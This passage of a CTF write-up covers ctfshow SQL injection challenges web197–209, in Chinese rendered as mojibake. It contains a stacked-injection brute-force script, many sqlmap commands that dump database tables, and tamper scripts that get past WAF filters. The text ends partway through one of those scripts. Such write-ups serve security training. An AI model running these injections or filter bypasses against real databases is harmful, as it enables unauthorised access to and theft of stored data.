</code></pre><p>å…¶ä»–çš„ä¸€äº›éªšæ“ä½œ</p>
<p>é‡å†™ctfshow_userè¡¨</p>
<p><img alt="image-20250210001411101" loading="lazy" src="./assets/image-20250210001411101.png"></p>
<p>æŠŠå¯†ç å’Œidåˆ—äº’æ¢ä¹‹åçˆ†å¯†ç ï¼ˆå®é™…ä¸Šåœ¨çˆ†idï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c1"># @Author:Y4tacker</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user &#39;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                        <span class="s1">&#39;change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` &#39;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">                        <span class="s1">&#39;varchar(255);&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;0x61646d696e&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="s2">&#34;ç™»é™†æˆåŠŸ&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">break</span>
</span></span></code></pre></div><h4 id="web198">web198<a hidden class="anchor" aria-hidden="true" href="#web198">#</a></h4>
<p>åŒweb197</p>
<h4 id="web199">web199<a hidden class="anchor" aria-hidden="true" href="#web199">#</a></h4>
<p>é€šè§£ä¸€æŠŠæ¢­</p>
<h4 id="web200">web200<a hidden class="anchor" aria-hidden="true" href="#web200">#</a></h4>
<p>é€šè§£ä¸€æŠŠæ¢­</p>
<h4 id="web190-web200é€šè§£">web190-web200é€šè§£<a hidden class="anchor" aria-hidden="true" href="#web190-web200é€šè§£">#</a></h4>
<pre tabindex="0"><code>username=0;show tables;
pass=ctfshow_user
</code></pre><h4 id="sqlmapçš„ä½¿ç”¨">sqlmapçš„ä½¿ç”¨<a hidden class="anchor" aria-hidden="true" href="#sqlmapçš„ä½¿ç”¨">#</a></h4>
<h4 id="web201">web201<a hidden class="anchor" aria-hidden="true" href="#web201">#</a></h4>
<pre tabindex="0"><code> sqlmapæœ€æ–°ç‰ˆä¸‹è½½
 ä½¿ç”¨--user-agent æŒ‡å®šagent
 ä½¿ç”¨--referer ç»•è¿‡refereræ£€æŸ¥
</code></pre><pre tabindex="0"><code>æ£€æµ‹æ³¨å…¥ç±»å‹
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show

çˆ†æ•°æ®åº“
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs

çˆ†è¡¨
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web --tables 

çˆ†åˆ—
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D 
ctfshow_web -T ctfshow_user --columns

çˆ†å€¼
python sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web202">web202<a hidden class="anchor" aria-hidden="true" href="#web202">#</a></h4>
<pre tabindex="0"><code> sqlmapæœ€æ–°ç‰ˆä¸‹è½½

 ä½¿ç”¨--data è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼
</code></pre><pre tabindex="0"><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  }
</code></pre><p>é€šè¿‡å‘å‘½ä»¤è¡ŒåŠ å…¥&ndash;dataå‚æ•°è½¬åŒ–è¯·æ±‚æ–¹å¼ä¸ºpost</p>
<pre tabindex="0"><code>sqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data &#39;id=1&#39; --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
</code></pre><h4 id="web203">web203<a hidden class="anchor" aria-hidden="true" href="#web203">#</a></h4>
<pre tabindex="0"><code> sqlmapæœ€æ–°ç‰ˆä¸‹è½½
 ä½¿ç”¨--method è°ƒæ•´sqlmapçš„è¯·æ±‚æ–¹å¼
</code></pre><pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39;;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
   //ä»£ç è¿‡äºç®€å•ï¼Œä¸å®œå±•ç¤º
  }
</code></pre><p>&ndash;headers=&ldquo;Content-Type: text/plain&rdquo; ä»¥è¡¨å•å½¢å¼å‘é€</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; -D ctfshow_web -T ctfshow_user -C pass --dump 
</code></pre><h4 id="web204">web204<a hidden class="anchor" aria-hidden="true" href="#web204">#</a></h4>
<pre tabindex="0"><code>ä½¿ç”¨--cookie æäº¤cookieæ•°æ®
</code></pre><p>payload:</p>
<pre tabindex="0"><code> sqlmap -u &#34;http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917
6f63d87074e926a342a996872&#34; -D ctfshow_web -T ctfshow_user -C pass --dump
</code></pre><h4 id="web205">web205<a hidden class="anchor" aria-hidden="true" href="#web205">#</a></h4>
<pre tabindex="0"><code>apiè°ƒç”¨éœ€è¦é‰´æƒ
</code></pre><p>é€šè¿‡æŠ“åŒ…åˆ†æï¼Œåœ¨æ¯æ¬¡è¯·æ±‚<code>url/api/index.php</code>ä¹‹å‰éœ€è¦å…ˆè¯·æ±‚<code>URL/api/getTokn.php</code></p>
<p><img alt="image-20250213112654599" loading="lazy" src="./assets/image-20250213112654599.png"></p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php&#34; --method=&#34;PUT&#34; --data=&#34;id=1&#34; --referer=ctf.show --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=60prkqe8189934t5pv3ikepa16&#34; --safe-url=&#34;http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump
</code></pre><h4 id="web206">web206<a hidden class="anchor" aria-hidden="true" href="#web206">#</a></h4>
<pre tabindex="0"><code> sqléœ€è¦é—­åˆ
</code></pre><pre tabindex="0"><code>//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
</code></pre><p>sqlmapä¼šè‡ªåŠ¨æ„é€ é—­åˆï¼Œæ‰€ä»¥è·Ÿå‰ä¸€é¢˜æ²¡ä»€ä¹ˆåŒºåˆ«</p>
<p>ä½†æ˜¯ä¹Ÿå¯ä»¥æ‰‹åŠ¨æ„é€ ä¸€ä¸‹</p>
<p>payload:</p>
<pre tabindex="0"><code>æ ¹æ®sqlè¯­å¥ï¼Œæˆ‘ä»¬é‡‡ç”¨â€œ)#â€çš„æ–¹å¼è¿›è¡Œå³é—­åˆã€‚----suffix=&#34;)#&#34;
æ‰§è¡Œsqlmapå‘½ä»¤è¡Œ
sqlmap -u &#34;http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;&#34; --safe-url=&#34;https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; --dbs

sqlmap -u &#34;http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php&#34; --data &#34;id=1&#34; --user-agent=sqlmap --referer=ctf.show --method=put --headers=&#34;Content-Type:text/plain&#34; --cookie=&#34;PHPSESSID=lb4lslploh7thdl0hdsd1008f9;&#34; --safe-url=&#34;https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --suffix=&#34;)#&#34; -D ctfshow_web --tables

sqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=&#34;id=1&#34; --referer=ctf.show --dbms=mysql -D &#34;ctfshow_web&#34; -T &#34;ctfshow_flaxc&#34; -C &#34;flagv&#34; --dump  --headers=&#34;Content-Type: text/plain&#34; --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 
</code></pre><h4 id="web207">web207<a hidden class="anchor" aria-hidden="true" href="#web207">#</a></h4>
<p><a href="https://y4er.com/post/sqlmap-tamper/">Sqlmap Tamper ç¼–å†™</a></p>
<p>ç¤ºä¾‹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s2">See the file &#39;doc/COPYING&#39; for copying permission
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span> <span class="c1"># å½“å‰è„šæœ¬è°ƒç”¨ä¼˜å…ˆç­‰çº§</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span> <span class="c1"># å£°æ˜å½“å‰è„šæœ¬é€‚ç”¨/ä¸é€‚ç”¨çš„èŒƒå›´ï¼Œå¯ä»¥ä¸ºç©ºã€‚</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span> <span class="c1"># ç”¨äºç¯¡æ”¹Payloadã€ä»¥åŠè¯·æ±‚å¤´çš„ä¸»è¦å‡½æ•°</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span></code></pre></div><p>é¢˜ç›®</p>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,pass from ctfshow_user where id = (&#39;&#34;.$id.&#34;&#39;) limit 0,1;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
   return preg_match(&#39;/ /&#39;, $str);
  }
</code></pre><p>è¿™é‡Œä¼šå°†wafä¸­çš„å…³é”®è¯æ›¿æ¢æˆç©ºæ ¼</p>
<p>æ”¾ä¸€ä¸ªY4tackerå¤§ä½¬çš„è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># å‡è®¾åœ¨Python 3ç¯å¢ƒä¸­è¿è¡Œï¼Œå°†xrangeæ›¿æ¢ä¸ºrange</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># ä»lib.core.enumsæ¨¡å—ä¸­å¯¼å…¥PRIORITYæšä¸¾ç±»å‹</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># è®¾ç½®è„šæœ¬çš„ä¼˜å…ˆçº§ä¸ºä½</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s2">    ç¯¡æ”¹å‡½æ•°ï¼Œè°ƒç”¨space2commentå‡½æ•°å¯¹æœ‰æ•ˆè´Ÿè½½è¿›è¡Œå¤„ç†
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s2">    :param payload: å¾…å¤„ç†çš„æœ‰æ•ˆè´Ÿè½½
</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s2">    :param kwargs: å…¶ä»–å…³é”®å­—å‚æ•°
</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s2">    :return: å¤„ç†åçš„æœ‰æ•ˆè´Ÿè½½
</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s2">    å°†æœ‰æ•ˆè´Ÿè½½ä¸­çš„ç©ºæ ¼å­—ç¬¦æ›¿æ¢ä¸ºæ¢è¡Œç¬¦
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s2">    :param payload: å¾…å¤„ç†çš„æœ‰æ•ˆè´Ÿè½½
</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s2">    :return: å¤„ç†åçš„æœ‰æ•ˆè´Ÿè½½
</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="c1"># ç”¨äºè·Ÿè¸ªæ˜¯å¦åœ¨å•å¼•å·å†…</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="n">quote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="c1"># ç”¨äºè·Ÿè¸ªæ˜¯å¦åœ¨åŒå¼•å·å†…</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="n">doublequote</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="c1"># ç”¨äºè·Ÿè¸ªæ˜¯å¦é‡åˆ°ç¬¬ä¸€ä¸ªç©ºæ ¼</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">        <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">
</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">
</span></span><span class="line"><span class="ln">46</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">                <span class="c1"># å–åquoteçš„å€¼</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">                <span class="c1"># å–ådoublequoteçš„å€¼</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">53</span><span class="cl">
</span></span><span class="line"><span class="ln">54</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>å…¶å®è¿™æ®µä»£ç çš„ç›®çš„å°±æ˜¯å°†payloadä¸­çš„ç©ºæ ¼æ›¿æ¢æˆæ¢è¡Œç¬¦</p>
<p>å…¶å®ç›´æ¥ç”¨sqlmapè‡ªå¸¦çš„sapce2commentæ¨¡æ¿</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump
</code></pre><h4 id="web208">web208<a hidden class="anchor" aria-hidden="true" href="#web208">#</a></h4>
<p>åŒä¸Šä¸€é¢˜</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump
</code></pre><h4 id="web209">web209<a hidden class="anchor" aria-hidden="true" href="#web209">#</a></h4>
<p>è¿™é¢˜æ–°å¢äº†ç‚¹waf</p>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
è¿”å›é€»è¾‘

//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤
  function waf($str){
   //TODO æœªå®Œå·¥
   return preg_match(&#39;/ |\*|\=/&#39;, $str);
  }
</code></pre><p>Y4tackerå¤§ä½¬çš„tamper</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.compat</span> <span class="kn">import</span> <span class="n">xrange</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
